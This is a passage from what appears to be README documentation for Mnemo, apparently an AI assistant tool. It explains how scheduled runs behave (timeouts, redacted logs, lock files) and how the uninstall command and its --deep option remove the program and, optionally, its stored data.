is 0. Each run has a timeout (30 minutes by default); its log is redacted, mode 0600, and the
last 20 are kept. `lastRun` is stored before a run starts, a window missed while Mnemo was
off fires once, and a lock file keeps two schedulers from running the same job. Nothing starts
by itself: `mnemo schedule run` stays in the foreground, and `run --once` is for your own
cron, systemd, launchd or Task Scheduler entry.

## Uninstalling

`mnemo uninstall` removes the program (`mnemo` and `memsrv` in `$MNEMO_HOME/bin`,
the link on your `PATH`) and keeps what Mnemo learned. `--deep` also deletes
`$MNEMO_HOME` (memory, sessions, the credentials from `/login`, skills, logs,
settings) after you type `delete` (`--yes` skips the question). The install scripts do the same
(`sh -s -- --uninstall` / `--deep`, or `MNEMO_UNINSTALL=1` / `deep` on Windows).
Keys that live in your environment or in other tools are not touched.
